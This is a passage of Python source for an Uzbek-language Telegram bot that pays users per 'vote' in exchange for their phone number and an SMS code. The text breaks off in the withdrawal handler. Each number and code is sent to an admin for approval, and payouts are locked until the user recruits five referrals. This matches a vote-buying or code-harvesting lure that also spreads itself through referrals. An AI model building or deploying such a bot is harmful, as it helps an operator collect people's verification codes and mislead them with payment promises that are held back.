import asyncio
import psycopg2
import psycopg2.extras
import os
import logging
import re
import random
import string
import time
import json
from collections import defaultdict
from datetime import datetime, timedelta
from contextlib import contextmanager
from functools import wraps
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from dotenv import load_dotenv
from psycopg2.pool import SimpleConnectionPool

load_dotenv()

# ================= LOGGING =================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ================= KONFIG =================
class Config:
    BOT_TOKEN = os.getenv("BOT_TOKEN")
    ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
    DATABASE_URL = os.getenv("DATABASE_URL")
    PORT = int(os.getenv("PORT", 10000))
    VOICE_PRICE = int(os.getenv("VOICE_PRICE", "20000"))
    MIN_WITHDRAW = int(os.getenv("MIN_WITHDRAW", "20000"))
    MAX_WITHDRAW = int(os.getenv("MAX_WITHDRAW", "1000000"))
    MIN_REFERRALS = int(os.getenv("MIN_REFERRALS", "5"))
    CODE_EXPIRE_MINUTES = int(os.getenv("CODE_EXPIRE_MINUTES", "5"))
    RATE_LIMIT_SECONDS = float(os.getenv("RATE_LIMIT_SECONDS", "3"))
    TEST_MODE = os.getenv("TEST_MODE", "false").lower() == "true"
    
    if TEST_MODE:
        VOICE_PRICE = 100
        MIN_WITHDRAW = 100
        MIN_REFERRALS = 1

if not Config.BOT_TOKEN:
    logger.error("❌ BOT_TOKEN topilmadi!")
    exit(1)

if Config.ADMIN_ID == 0:
    logger.error("❌ ADMIN_ID topilmadi!")
    exit(1)

# Bot yaratish
bot = Bot(
    token=Config.BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)
dp = Dispatcher()

# ================= DATABASE POOL =================
db_pool = None

def init_db_pool():
    global db_pool
    try:
        db_pool = SimpleConnectionPool(
            1, 
            20, 
            Config.DATABASE_URL, 
            sslmode='require',
            keepalives=1,
            keepalives_idle=30,
            keepalives_interval=10,
            keepalives_count=5
        )
        logger.info("✅ Database pool yaratildi")
    except Exception as e:
        logger.error(f"❌ Database pool xatosi: {e}")
        raise

def get_db_connection():
    return db_pool.getconn()

def return_db_connection(conn):
    db_pool.putconn(conn)

@contextmanager
def db_cursor():
    """Database cursor context manager"""
    conn = None
    cursor = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        yield cursor
        conn.commit()
    except Exception as e:
        if conn:
            conn.rollback()
        logger.error(f"Database error: {e}")
        raise
    finally:
        if cursor:
            cursor.close()
        if conn:
            return_db_connection(conn)

def execute_query(query, params=None, fetch_one=False, fetch_all=False):
    """Execute query and return result"""
    conn = None
    cursor = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute(query, params)
        
        if fetch_one:
            result = cursor.fetchone()
        elif fetch_all:
            result = cursor.fetchall()
        else:
            result = None
            
        conn.commit()
        return result
    except Exception as e:
        if conn:
            conn.rollback()
        logger.error(f"Query error: {e}")
        raise
    finally:
        if cursor:
            cursor.close()
        if conn:
            return_db_connection(conn)

# ================= HOLATLAR =================
user_states = {}
user_phones = {}
admin_states = {}
withdraw_states = {}
user_last_request = defaultdict(float)
user_cache = {}

# ================= RATE LIMITING =================
def check_rate_limit(user_id, limit_seconds=None):
    if limit_seconds is None:
        limit_seconds = Config.RATE_LIMIT_SECONDS
    current_time = time.time()
    if current_time - user_last_request[user_id] < limit_seconds:
        return False
    user_last_request[user_id] = current_time
    return True

def rate_limit(limit_seconds=None):
    """Decorator for rate limiting"""
    def decorator(func):
        @wraps(func)
        async def wrapper(message: types.Message, *args, **kwargs):
            user_id = message.from_user.id
            if not check_rate_limit(user_id, limit_seconds):
                await message.answer("⏳ Iltimos, biroz kuting...")
                return
            return await func(message, *args, **kwargs)
        return wrapper
    return decorator

# ================= TUGMALAR =================
def get_phone_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📞 Telefon raqamni yuborish", request_contact=True)],
            [KeyboardButton(text="❌ Bekor qilish")]
        ],
        resize_keyboard=True,
        one_time_keyboard=True
    )

def get_user_menu():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🗳️ Ovoz berish")],
            [KeyboardButton(text="💳 Hamyon"), KeyboardButton(text="💰 Balans")],
            [KeyboardButton(text="💸 Yechish")],
            [KeyboardButton(text="👥 Referallar"), KeyboardButton(text="📜 Tarix")]
        ],
        resize_keyboard=True
    )

def get_admin_menu():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📊 Statistika")],
            [KeyboardButton(text="📨 Barchaga xabar")],
            [KeyboardButton(text="📋 Kutayotgan kodlar")],
            [KeyboardButton(text="💸 Yechish so'rovlari")],
            [KeyboardButton(text="✅ Tasdiqlangan raqamlar")],
            [KeyboardButton(text="👥 Foydalanuvchilar")]
        ],
        resize_keyboard=True
    )

# ================= VALIDATSIYA =================
def normalize_phone(phone):
    """Telefon raqamni normalizatsiya qilish"""
    phone = re.sub(r'[\s\-\(\)]', '', phone)
    
    if phone.startswith('+998') and len(phone) == 13:
        return phone
    
    if phone.startswith('998') and len(phone) == 12:
        return '+' + phone
    
    if len(phone) == 9 and phone.startswith('9'):
        return '+998' + phone
    
    return None

def is_valid_phone(phone):
    """Telefon raqamni tekshirish"""
    normalized = normalize_phone(phone)
    if not normalized:
        return False
    
    if normalized.startswith('+998') and len(normalized) == 13:
        number = normalized[4:]
        if len(number) == 9 and number.isdigit():
            operator_codes = ['90', '91', '93', '94', '95', '97', '98', '99', '88', '33']
            return number[:2] in operator_codes
    
    return False

def validate_withdrawal_info(info):
    """Yechish ma'lumotini tekshirish"""
    if re.match(r'^\d{16}$', info.replace(' ', '')) or re.match(r'^\d{19}$', info.replace(' ', '')):
        return True, "card"
    
    if is_valid_phone(info):
        return True, "phone"
    
    return False, "invalid"

def generate_referral_code():
    """Unique referral code yaratish"""
    while True:
        code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        result = execute_query(
            "SELECT COUNT(*) FROM users WHERE referral_code = %s",
            (code,),
            fetch_one=True
        )
        if result[0] == 0:
            return code

# ================= DATABASE =================
def init_db():
    """Database jadvallarini yaratish"""
    queries = [
        """
        CREATE TABLE IF NOT EXISTS users (
            id SERIAL PRIMARY KEY,
            telegram_id BIGINT UNIQUE NOT NULL,
            phone VARCHAR(20) NOT NULL DEFAULT 'no_phone_yet',
            balance INTEGER DEFAULT 0,
            referral_code VARCHAR(20) UNIQUE,
            referred_by BIGINT DEFAULT NULL,
            is_blocked BOOLEAN DEFAULT FALSE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
        """,
        """
        CREATE TABLE IF NOT EXISTS codes (
            id SERIAL PRIMARY KEY,
            phone VARCHAR(20) NOT NULL,
            code VARCHAR(10) NOT NULL,
            telegram_id BIGINT NOT NULL,
            status VARCHAR(20) DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            expires_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP + INTERVAL '5 minutes'
        )
        """,
        """
        CREATE TABLE IF NOT EXISTS verified_phones (
            id SERIAL PRIMARY KEY,
            phone VARCHAR(20) UNIQUE NOT NULL,
            telegram_id BIGINT NOT NULL,
            verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
        """,
        """
        CREATE TABLE IF NOT EXISTS transactions (
            id SERIAL PRIMARY KEY,
            telegram_id BIGINT NOT NULL,
            amount INTEGER NOT NULL,
            type VARCHAR(20) DEFAULT 'deposit',
            description TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
        """,
        """
        CREATE TABLE IF NOT EXISTS withdraws (
            id SERIAL PRIMARY KEY,
            telegram_id BIGINT NOT NULL,
            phone VARCHAR(100) NOT NULL,
            amount INTEGER NOT NULL,
            status VARCHAR(20) DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            processed_at TIMESTAMP
        )
        """,
        """
        CREATE TABLE IF NOT EXISTS referrals (
            id SERIAL PRIMARY KEY,
            referrer_id BIGINT NOT NULL,
            referred_id BIGINT NOT NULL UNIQUE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
        """,
        "CREATE INDEX IF NOT EXISTS idx_users_telegram_id ON users(telegram_id)",
        "CREATE INDEX IF NOT EXISTS idx_codes_status ON codes(status)",
        "CREATE INDEX IF NOT EXISTS idx_transactions_user ON transactions(telegram_id)",
        "CREATE INDEX IF NOT EXISTS idx_withdraws_status ON withdraws(status)"
    ]
    
    conn = None
    cursor = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        for query in queries:
            cursor.execute(query)
        conn.commit()
        logger.info("✅ Database tayyor")
    except Exception as e:
        if conn:
            conn.rollback()
        logger.error(f"❌ Database init xatosi: {e}")
        raise
    finally:
        if cursor:
            cursor.close()
        if conn:
            return_db_connection(conn)

def get_user(telegram_id):
    """Foydalanuvchi ma'lumotlarini olish"""
    return execute_query(
        "SELECT * FROM users WHERE telegram_id = %s",
        (telegram_id,),
        fetch_one=True
    )

def get_referral_count(telegram_id):
    """Referallar sonini olish"""
    result = execute_query(
        "SELECT COUNT(*) FROM referrals WHERE referrer_id = %s",
        (telegram_id,),
        fetch_one=True
    )
    return result[0] if result else 0

def is_phone_verified(phone):
    """Telefon raqam tasdiqlanganligini tekshirish"""
    result = execute_query(
        "SELECT COUNT(*) FROM verified_phones WHERE phone = %s",
        (phone,),
        fetch_one=True
    )
    return result[0] > 0 if result else False

def add_transaction(telegram_id, amount, type='deposit', description=None):
    """Tranzaksiya qo'shish"""
    execute_query(
        "INSERT INTO transactions (telegram_id, amount, type, description) VALUES (%s, %s, %s, %s)",
        (telegram_id, amount, type, description)
    )

# ================= SMS YUBORISH (MOCK) =================
async def send_sms_code(phone, code):
    """SMS kod yuborish (mock - real integratsiya qo'shish kerak)"""
    logger.info(f"SMS kod {code} raqamga yuborildi: {phone}")
    
    if Config.TEST_MODE:
        try:
            await bot.send_message(
                Config.ADMIN_ID,
                f"🔑 Test SMS kod:\n"
                f"📞 Telefon: {phone}\n"
                f"🔑 Kod: {code}"
            )
        except:
            pass
    
    return True

def generate_sms_code():
    """6 xonali SMS kod yaratish"""
    return ''.join(random.choices(string.digits, k=6))

# ================= 1. START =================
@dp.message(Command("start"))
@rate_limit()
async def start(message: types.Message):
    telegram_id = message.from_user.id
    logger.info(f"👤 /start bosildi: {telegram_id}")
    
    if telegram_id == Config.ADMIN_ID:
        await message.answer("👋 Xush kelibsiz, Admin!", reply_markup=get_admin_menu())
        return
    
    try:
        # Foydalanuvchini qo'shish
        execute_query(
            "INSERT INTO users (telegram_id, phone) VALUES (%s, 'no_phone_yet') "
            "ON CONFLICT (telegram_id) DO NOTHING",
            (telegram_id,)
        )
        
        user = get_user(telegram_id)
        
        if not user:
            await message.answer("❌ Xatolik! Qaytadan urinib ko'ring.")
            return
        
        if user[6]:  # is_blocked
            await message.answer("❌ Siz bloklangansiz! Admin bilan bog'laning.")
            return
        
        if not user[4]:  # referral_code
            ref_code = generate_referral_code()
            execute_query(
                "UPDATE users SET referral_code = %s WHERE telegram_id = %s",
                (ref_code, telegram_id)
            )
            user = get_user(telegram_id)
        
        bot_info = await bot.get_me()
        ref_link = f"https://t.me/{bot_info.username}?start=ref_{telegram_id}"
        
        phone = user[2]
        balance = user[3]
        
        if phone == "no_phone_yet" or phone is None:
            user_states[telegram_id] = "waiting_phone"
            
            await message.answer(
                f"🎉 <b>ASSALOMU ALAYKUM!</b>\n\n"
                f"💰 <b>1 OVOZ = {Config.VOICE_PRICE:,} SO'M</b>\n\n"
                f"🔥 <b>HOZIROQ OVOZ BERING!</b>\n\n"
                f"📝 <b>Qanday ishlaydi:</b>\n"
                f"1️⃣ Telefon raqamingizni yuboring\n"
                f"2️⃣ SMS kodni kiriting\n"
                f"3️⃣ Admin tasdiqlaydi\n"
                f"4️⃣ {Config.VOICE_PRICE:,} so'm olasiz!\n\n"
                f"👤 <b>Sizning referal link:</b>\n"
                f"<code>{ref_link}</code>\n\n"
                f"📱 <b>Telefon raqamingizni yuboring:</b>",
                reply_markup=get_phone_keyboard()
            )
        else:
            phone_verified = is_phone_verified(phone)
            ref_count = get_referral_count(telegram_id)
            
            status_text = "✅ Tasdiqlangan" if phone_verified else "⏳ Kutilmoqda"
            
            await message.answer(
                f"👋 <b>Xush kelibsiz!</b>\n\n"
                f"📱 <b>Telefon:</b> {phone}\n"
                f"📊 <b>Holat:</b> {status_text}\n"
                f"💰 <b>Balans:</b> {balance:,} so'm\n"
                f"👥 <b>Referallar:</b> {ref_count}/{Config.MIN_REFERRALS}\n\n"
                f"👇 Pastdagi tugmalardan foydalaning:",
                reply_markup=get_user_menu()
            )
    except Exception as e:
        logger.error(f"❌ Start xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi! Qaytadan /start bosing")

# ================= REFERRAL START =================
@dp.message(lambda message: message.text and message.text.startswith('/start ref_'))
@rate_limit()
async def handle_referral(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == Config.ADMIN_ID:
        await start(message)
        return
    
    ref_code = message.text.replace('/start ref_', '')
    
    try:
        referer = execute_query(
            "SELECT telegram_id FROM users WHERE referral_code = %s",
            (ref_code,),
            fetch_one=True
        )
        
        if referer and referer[0] != telegram_id:
            execute_query(
                "INSERT INTO users (telegram_id, phone) VALUES (%s, 'no_phone_yet') "
                "ON CONFLICT (telegram_id) DO NOTHING",
                (telegram_id,)
            )
            
            try:
                execute_query(
                    "INSERT INTO referrals (referrer_id, referred_id) VALUES (%s, %s)",
                    (referer[0], telegram_id)
                )
                
                ref_count = get_referral_count(referer[0])
                
                try:
                    await bot.send_message(
                        referer[0],
                        f"👤 <b>YANGI REFERAL!</b>\n\n"
                        f"✅ Yana bir do'stingiz botga qo'shildi!\n"
                        f"📊 Jami referallar: {ref_count}/{Config.MIN_REFERRALS}\n"
                        f"🎯 Yechish uchun {Config.MIN_REFERRALS} ta kerak"
                    )
                except:
                    pass
            except Exception as e:
                if "duplicate" not in str(e).lower():
                    logger.error(f"Referral qo'shishda xatolik: {e}")
        
        await start(message)
    except Exception as e:
        logger.error(f"❌ Referral xatosi: {e}")
        await start(message)

# ================= 2. OVOZ BERISH =================
@dp.message(F.text == "🗳️ Ovoz berish")
@rate_limit()
async def vote_start(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == Config.ADMIN_ID:
        await message.answer("👋 Siz adminsiz, /start bosing")
        return
    
    try:
        user = get_user(telegram_id)
        
        if not user:
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
            return
        
        if user[6]:  # is_blocked
            await message.answer("❌ Siz bloklangansiz!")
            return
        
        if user[2] != "no_phone_yet" and is_phone_verified(user[2]):
            await message.answer(
                "❌ Siz allaqachon ovoz bergansiz!\n"
                "Bu raqam bilan boshqa ovoz bera olmaysiz.",
                reply_markup=get_user_menu()
            )
            return
        
        user_states[telegram_id] = "waiting_phone"
        await message.answer(
            f"🗳️ <b>OVOZ BERISH</b>\n\n"
            f"💰 1 ta ovoz = {Config.VOICE_PRICE:,} so'm\n\n"
            f"📱 Telefon raqamingizni yuboring:",
            reply_markup=get_phone_keyboard()
        )
    except Exception as e:
        logger.error(f"❌ Ovoz berish xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi!")

# ================= 3-4. TELEFON RAQAM =================
@dp.message(F.contact)
async def receive_phone_contact(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == Config.ADMIN_ID:
        await message.answer("❌ Siz adminsiz, kontakt yubora olmaysiz!")
        return
    
    if user_states.get(telegram_id) != "waiting_phone":
        await message.answer("❌ Iltimos, /start yoki 🗳️ Ovoz berish tugmasini bosing!")
        return
    
    if not check_rate_limit(telegram_id):
        await message.answer("⏳ Iltimos, biroz kuting...")
        return
    
    phone = message.contact.phone_number
    await process_phone(message, phone)

@dp.message(F.text == "❌ Bekor qilish")
async def cancel_action(message: types.Message):
    telegram_id = message.from_user.id
    
    user_states.pop(telegram_id, None)
    user_phones.pop(telegram_id, None)
    withdraw_states.pop(telegram_id, None)
    
    await message.answer("✅ Bekor qilindi", reply_markup=get_user_menu())

@dp.message(lambda message: user_states.get(message.from_user.id) == "waiting_phone")
async def receive_phone_text(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == Config.ADMIN_ID:
        return
    
    if not check_rate_limit(telegram_id):
        await message.answer("⏳ Iltimos, biroz kuting...")
        return
    
    phone = message.text.strip()
    
    if not is_valid_phone(phone):
        await message.answer(
            "❌ Noto'g'ri telefon raqam formati!\n\n"
            "To'g'ri formatlar:\n"
            "• +998901234567\n"
            "• 998901234567\n"
            "• 901234567\n\n"
            "Iltimos, qaytadan kiriting:"
        )
        return
    
    normalized_phone = normalize_phone(phone)
    await process_phone(message, normalized_phone)

async def process_phone(message: types.Message, phone: str):
    telegram_id = message.from_user.id
    
    try:
        if is_phone_verified(phone):
            await message.answer(
                "❌ Bu telefon raqami allaqachon ishlatilgan!\n"
                "Boshqa raqam kiriting:",
                reply_markup=get_phone_keyboard()
            )
            return
        
        execute_query(
            "UPDATE users SET phone = %s, updated_at = CURRENT_TIMESTAMP WHERE telegram_id = %s",
            (phone, telegram_id)
        )
        
        user_phones[telegram_id] = phone
        user_states[telegram_id] = "waiting_code"
        
        # SMS kod yuborish (mock)
        sms_code = generate_sms_code()
        await send_sms_code(phone, sms_code)
        
        # Test rejimida kodni foydalanuvchiga ham ko'rsatish
        if Config.TEST_MODE:
            await message.answer(
                f"🧪 <b>TEST REJIMI</b>\n"
                f"📱 Telefon: {phone}\n"
                f"🔑 SMS Kod: <code>{sms_code}</code>\n\n"
                f"Iltimos, ushbu kodni kiriting:"
            )
        else:
            await message.answer(
                f"✅ {phone} raqamiga SMS kod yuborildi!\n\n"
                f"📨 Iltimos, telefoningizga kelgan 6 xonali kodni kiriting:\n"
                f"⏳ Kod {Config.CODE_EXPIRE_MINUTES} daqiqada amal qiladi."
            )
        
        # Admin'ga xabar
        try:
            await bot.send_message(
                Config.ADMIN_ID,
                f"📱 <b>YANGI TELEFON RAQAM</b>\n\n"
                f"🆔 ID: <code>{telegram_id}</code>\n"
                f"📞 Telefon: <code>{phone}</code>\n"
                f"🔑 SMS Kod: <code>{sms_code}</code>\n"
                f"⏳ Kod kutilmoqda..."
            )
        except Exception as e:
            logger.error(f"❌ Admin'ga yuborishda xatolik: {e}")
        
        # Kodni saqlash
        execute_query(
            "INSERT INTO codes (phone, code, telegram_id, status) VALUES (%s, %s, %s, 'pending')",
            (phone, sms_code, telegram_id)
        )
        
    except Exception as e:
        logger.error(f"❌ Telefonni saqlashda xatolik: {e}")
        await message.answer("❌ Xatolik yuz berdi! Qaytadan urinib ko'ring.")

# ================= 5. KODNI QABUL QILISH =================
@dp.message(lambda message: user_states.get(message.from_user.id) == "waiting_code")
async def receive_code(message: types.Message):
    code = message.text.strip()
    telegram_id = message.from_user.id
    phone = user_phones.get(telegram_id)
    
    if not phone:
        await message.answer("❌ Xatolik! /start bosing")
        return
    
    if not check_rate_limit(telegram_id, 2):
        await message.answer("⏳ Iltimos, biroz kuting...")
        return
    
    if len(code) != 6 or not code.isdigit():
        await message.answer("❌ 6 xonali kod kiriting:")
        return
    
    try:
        # Eski kodlarni yopish
        execute_query(
            "UPDATE codes SET status = 'expired' WHERE telegram_id = %s AND status = 'pending'",
            (telegram_id,)
        )
        
        # Kodni tekshirish
        code_record = execute_query(
            "SELECT * FROM codes WHERE phone = %s AND code = %s AND status = 'pending' AND expires_at > NOW()",
            (phone, code),
            fetch_one=True
        )
        
        if not code_record:
            await message.answer(
                "❌ Noto'g'ri kod yoki kod muddati tugagan!\n"
                "Qaytadan urinib ko'ring."
            )
            return
        
        # Kodni tasdiqlashga yuborish
        execute_query(
            "UPDATE codes SET status = 'pending_verify' WHERE id = %s",
            (code_record[0],)
        )
        
        await message.answer(
            "⏳ Kodingiz qabul qilindi!\nAdmin tekshirib, tasdiqlaydi...",
            reply_markup=get_user_menu()
        )
        
        try:
            user_info = await bot.get_chat(telegram_id)
            user_name = user_info.full_name
            user_username = user_info.username or "yo'q"
            
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [
                    InlineKeyboardButton(text="✅ To'g'ri kod", callback_data=f"verify_{telegram_id}_{code}"),
                    InlineKeyboardButton(text="❌ Noto'g'ri kod", callback_data=f"reject_{telegram_id}")
                ]
            ])
            
            await bot.send_message(
                Config.ADMIN_ID,
                f"🔑 <b>KOD TEKSHIRISH KERAK</b>\n\n"
                f"👤 <b>Foydalanuvchi:</b> {user_name}\n"
                f"🔗 <b>Profil:</b> @{user_username}\n"
                f"🆔 <b>ID:</b> <code>{telegram_id}</code>\n"
                f"📞 <b>Telefon:</b> <code>{phone}</code>\n"
                f"🔑 <b>Kod:</b> <code>{code}</code>\n"
                f"⏳ <b>Muddati:</b> {Config.CODE_EXPIRE_MINUTES} daqiqa",
                reply_markup=keyboard
            )
        except Exception as e:
            logger.error(f"❌ Admin'ga kod yuborishda xatolik: {e}")
        
        user_states[telegram_id] = "done"
        user_phones.pop(telegram_id, None)
        
    except Exception as e:
        logger.error(f"❌ Kodni saqlashda xatolik: {e}")
        await message.answer("❌ Xatolik yuz berdi!")

# ================= 6. ADMIN TASDIQLASH =================
@dp.callback_query(lambda c: c.data.startswith(("verify_", "reject_")))
async def admin_action(callback: types.CallbackQuery):
    data = callback.data.split("_")
    action = data[0]
    
    if action == "verify":
        telegram_id = int(data[1])
        code = data[2]
        
        try:
            code_record = execute_query(
                "SELECT * FROM codes WHERE telegram_id = %s AND code = %s AND status = 'pending_verify'",
                (telegram_id, code),
                fetch_one=True
            )
            
            if not code_record:
                await callback.answer("❌ Kod topilmadi!", show_alert=True)
                return
            
            is_expired = execute_query(
                "SELECT expires_at < NOW() FROM codes WHERE id = %s",
                (code_record[0],),
                fetch_one=True
            )[0]
            
            if is_expired:
                execute_query(
                    "UPDATE codes SET status = 'expired' WHERE id = %s",
                    (code_record[0],)
                )
                await callback.answer("⏰ Kod muddati tugagan!", show_alert=True)
                return
            
            phone = code_record[1]
            
            if is_phone_verified(phone):
                execute_query(
                    "UPDATE codes SET status = 'rejected' WHERE id = %s",
                    (code_record[0],)
                )
                await callback.answer("❌ Bu raqam allaqachon ishlatilgan!", show_alert=True)
                
                try:
                    await bot.send_message(
                        telegram_id,
                        "❌ Bu telefon raqami allaqachon ishlatilgan!",
                        reply_markup=get_user_menu()
                    )
                except:
                    pass
                return
            
            execute_query(
                "UPDATE codes SET status = 'verified' WHERE id = %s",
                (code_record[0],)
            )
            
            execute_query(
                "INSERT INTO verified_phones (phone, telegram_id) VALUES (%s, %s)",
                (phone, telegram_id)
            )
            
            execute_query(
                "UPDATE users SET balance = balance + %s, updated_at = CURRENT_TIMESTAMP WHERE telegram_id = %s",
                (Config.VOICE_PRICE, telegram_id)
            )
            
            add_transaction(telegram_id, Config.VOICE_PRICE, 'deposit', 'Ovoz berish uchun')
            
            try:
                await bot.send_message(
                    telegram_id,
                    f"✅ <b>TABRIKLAYMIZ!</b> 🎉\n\n"
                    f"💰 Hisobingizga <b>+{Config.VOICE_PRICE:,} so'm</b> qo'shildi!",
                    reply_markup=get_user_menu()
                )
            except Exception as e:
                logger.error(f"❌ Foydalanuvchiga xabar yuborishda xatolik: {e}")
            
            await callback.message.edit_text(
                f"✅ <b>TASDIQLANDI!</b>\n\n"
                f"👤 ID: {telegram_id}\n"
                f"📞 Tel: {phone}\n"
                f"💰 +{Config.VOICE_PRICE:,} so'm"
            )
            await callback.answer("✅ Tasdiqlandi!")
            
        except Exception as e:
            logger.error(f"❌ Tasdiqlashda xatolik: {e}")
            await callback.answer("❌ Xatolik!", show_alert=True)
    
    elif action == "reject":
        telegram_id = int(data[1])
        
        try:
            execute_query(
                "UPDATE codes SET status = 'rejected' WHERE telegram_id = %s AND status = 'pending_verify'",
                (telegram_id,)
            )
            
            try:
                await bot.send_message(
                    telegram_id,
                    "❌ Kod noto'g'ri!\n\n"
                    "🗳️ Qaytadan ovoz berish tugmasini bosing.",
                    reply_markup=get_user_menu()
                )
            except Exception as e:
                logger.error(f"❌ Foydalanuvchiga xabar yuborishda xatolik: {e}")
            
            await callback.message.edit_text(
                f"❌ <b>RAD ETILDI!</b>\n\n👤 ID: {telegram_id}"
            )
            await callback.answer("❌ Rad etildi!")
            
        except Exception as e:
            logger.error(f"❌ Rad etishda xatolik: {e}")
            await callback.answer("❌ Xatolik!", show_alert=True)

# ================= 7. HAMYON / BALANS =================
@dp.message(F.text.in_(["💳 Hamyon", "💰 Balans"]))
@rate_limit()
async def show_balance(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == Config.ADMIN_ID:
        await message.answer("👋 Siz adminsiz, /start bosing")
        return
    
    try:
        user = get_user(telegram_id)
        
        if not user:
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
            return
        
        if user[6]:  # is_blocked
            await message.answer("❌ Siz bloklangansiz!")
            return
        
        if user[2] == "no_phone_yet":
            await message.answer(
                "❌ Siz hali ro'yxatdan o'tmagansiz!\n\n"
                "🗳️ Ovoz berish tugmasini bosing va telefon raqamingizni yuboring.",
                reply_markup=get_user_menu()
            )
            return
        
        phone_verified = is_phone_verified(user[2])
        ref_count = get_referral_count(telegram_id)
        
        status = "✅ Tasdiqlangan" if phone_verified else "⏳ Kutilmoqda"
        
        # Oxirgi tranzaksiyalar
        recent_transactions = execute_query(
            "SELECT * FROM transactions WHERE telegram_id = %s ORDER BY id DESC LIMIT 5",
            (telegram_id,),
            fetch_all=True
        )
        
        transactions_text = ""
        if recent_transactions:
            transactions_text = "\n\n📜 <b>Oxirgi tranzaksiyalar:</b>\n"
            for trans in recent_transactions:
                sign = "+" if trans[3] == 'deposit' else "-"
                transactions_text += f"{sign}{trans[2]:,} so'm - {trans[4] or 'Tranzaksiya'}\n"
        
        await message.answer(
            f"💳 <b>Hamyon</b>\n\n"
            f"📱 Telefon: {user[2]}\n"
            f"📊 Holat: {status}\n"
            f"💰 Balans: {user[3]:,} so'm\n"
            f"👥 Referallar: {ref_count}/{Config.MIN_REFERRALS}\n"
            f"{transactions_text}\n"
            f"💸 Yechish uchun {Config.MIN_REFERRALS} ta referral kerak.",
            reply_markup=get_user_menu()
        )
    except Exception as e:
        logger.error(f"❌ Balans xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi!")

# ================= 8. YECHISH =================
@dp.message(F.text == "💸 Yechish")
@rate_limit()
async def withdraw_start(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == Config.ADMIN_ID:
        await message.answer("👋 Siz adminsiz, /start bosing")
        return
    
    try:
        user = get_user(telegram_id)
        
        if not user:
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
            return
        
        if user[6]:  # is_blocked
            await message.answer("❌ Siz bloklangansiz!")
            return
        
        if user[2] == "no_phone_yet":
            await message.answer(
                "❌ Siz hali ro'yxatdan o'tmagansiz!\n\n"
                "🗳️ Ovoz berish tugmasini bosing va telefon raqamingizni yuboring.",
                reply_markup=get_user_menu()
            )
            return
        
        if not is_phone_verified(user[2]):
            await message.answer(
                "❌ Telefon raqamingiz hali tasdiqlanmagan!\n"
                "Admin tasdiqlashini kuting.",
                reply_markup=get_user_menu()
            )
            return
        
        balance = user[3]
        
        if balance < Config.MIN_WITHDRAW:
            await message.answer(
                f"❌ Balans: {balance:,} so'm\n"
                f"💰 Yechish uchun {Config.MIN_WITHDRAW:,} so'm kerak!\n"
                f"Yana {Config.MIN_WITHDRAW - balance:,} so'm kerak.",
                reply_markup=get_user_menu()
            )
            return
        
        ref_count = get_referral_count(telegram_id)
        
        if ref_count < Config.MIN_REFERRALS:
            bot_info = await bot.get_me()
            ref_link = f"https://t.me/{bot_info.username}?start=ref_{telegram_id}"
            await message.answer(
                f"❌ <b>Yechish uchun {Config.MIN_REFERRALS} ta do'stingiz botga start bosishi kerak!</b>\n\n"
                f"👥 Sizda: {ref_count} ta\n"
                f"🎯 Kerak: {Config.MIN_REFERRALS} ta\n\n"
                f"🔗 <b>Referal link:</b>\n"
                f"<code>{ref_link}</code>\n\n"
                f"📤 Linkni do'stlaringizga yuboring!"
            )
            return
        
        withdraw_states[telegram_id] = "waiting_withdraw_info"
        await message.answer(
            f"✅ <b>Yechish uchun tayyormisiz!</b>\n\n"
            f"💰 Balans: {balance:,} so'm\n"
            f"👥 Referallar: {ref_count} ta\n\n"
            f"📱 Karta raqami yoki telefon raqamingizni yuboring:\n"
            f"❌ Bekor qilish uchun shu so'zni yozing.",
            reply_markup=ReplyKeyboardMarkup(
                keyboard=[[KeyboardButton(text="❌ Bekor qilish")]],
                resize_keyboard=True
            )
        )
    except Exception as e:
        logger.error(f"❌ Yechish xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi!")

# ================= 9. YECHISH MA'LUMOTI =================
@dp.message(lambda message: withdraw_states.get(message.from_user.id) == "waiting_withdraw_info")
async def withdraw_info(message: types.Message):
    telegram_id = message.from_user.id
    info = message.text.strip()
    
    if not check_rate_limit(telegram_id):
        await message.answer("⏳ Iltimos, biroz kuting...")
        return
    
    if len(info) < 5:
        await message.answer("❌ Ma'lumot juda qisqa! To'liq kiriting:")
        return
    
    is_valid, info_type = validate_withdrawal_info(info)
    
    if not is_valid:
